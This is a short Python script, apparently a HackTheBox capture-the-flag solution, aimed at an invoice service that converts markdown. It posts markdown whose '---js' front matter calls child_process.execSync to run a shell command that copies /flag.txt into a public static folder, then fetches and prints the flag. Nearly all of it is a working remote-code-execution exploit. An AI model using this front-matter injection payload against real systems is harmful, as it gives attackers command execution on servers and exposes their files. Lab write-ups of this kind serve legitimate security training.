import requests
import re

host, port = '83.136.255.113', 37513

url = f'http://{host}:{port}/api/invoice/add'

data = {
    "markdown_content": """---js
((require("child_process")).execSync("cp /flag.txt /app/static"))
---RCE"""
}

response = requests.post(url, json=data)

flag_url = f'http://{host}:{port}/static/flag.txt'

flag_response = requests.get(flag_url)

flag = re.search(r'HTB\{.*?\}',flag_response.text)

print(flag.group())
